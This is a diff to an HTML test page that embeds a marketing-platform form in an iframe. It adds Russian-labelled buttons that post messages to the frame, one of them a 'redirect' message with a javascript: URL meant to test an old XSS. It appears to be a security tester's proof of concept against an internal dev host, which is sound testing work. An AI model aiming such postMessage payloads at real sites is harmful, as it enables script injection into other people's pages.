@@ -1,20 +1,58 @@
 <!DOCTYPE html>
-<html lang="en">
-
+<html>
 <head>
-    <meta charset="utf-8">
-    <title>tag-manager.lan</title>
-
+  <meta charset="UTF-8">
+  <title>Form Embed Test</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+    }
+    iframe {
+      width: 100%;
+      height: 600px;
+      border: 1px solid #ccc;
+      margin-top: 20px;
+    }
+    button {
+      padding: 10px 15px;
+      margin-right: 10px;
+      cursor: pointer;
+    }
+  </style>
 </head>
-
 <body>
-    <h1>Test tag manager</h1>
 
-    
+<h2>Тест формы во фрейме</h2>
 
-            <script src=https://cookiesaver.marketing-platform.devel:27443/form/js/embed_v1.js></script>
-<iframe src="https://cookiesaver.marketing-platform.devel:27443/form?form=aLsr2XHVuJdYGRLP122SSXg8c8cjDhuTEMifGwzW2Rtjzu9KRimnjpvHHDtVxrxb6z11AVijmGiZ8&iframe=1" frameborder="0" name="ak-form-aLsr2XHVuJdYGRLP122SSXg8c8cjDhuTEMifGwzW2Rtjzu9KRimnjpvHHDtVxrxb6z11AVijmGiZ8" class="ak-form" width="100%" sandbox="allow-same-origin allow-forms allow-scripts allow-popups allow-popups-to-escape-sandbox allow-top-navigation"></iframe>
-    
+<!-- ВСТАВЬ СЮДА URL СВОЕЙ ФОРМЫ -->
+<iframe id="formFrame" src="https://cookiesaver.marketing-platform.devel:27443/form?form=aLsr2XHVuJdYGRLP122SSXg8c8cjDhuTEMifGwzW2Rtjzu9KRimnjpvHHDtVxrxb6z11AVijmGiZ8"></iframe>
+
+<br><br>
+
+<button onclick="sendRedirect()">Попробовать redirect (старый XSS)</button>
+<button onclick="sendHeight()">Попробовать height-adjustment</button>
+
+<script>
+function sendRedirect() {
+  const iframe = document.getElementById('formFrame');
+
+  iframe.contentWindow.postMessage(JSON.stringify({
+    source: "ak",
+    type: "redirect",
+    data: { url: "javascript:alert('XSS TEST')" }
+  }), "*");
+}
+
+function sendHeight() {
+  const iframe = document.getElementById('formFrame');
+
+  iframe.contentWindow.postMessage(JSON.stringify({
+    source: "ak",
+    type: "height-adjustment",
+    data: { "iframe-height": 300 }
+  }), "*");
+}
+</script>
+
 </body>
-
 </html>
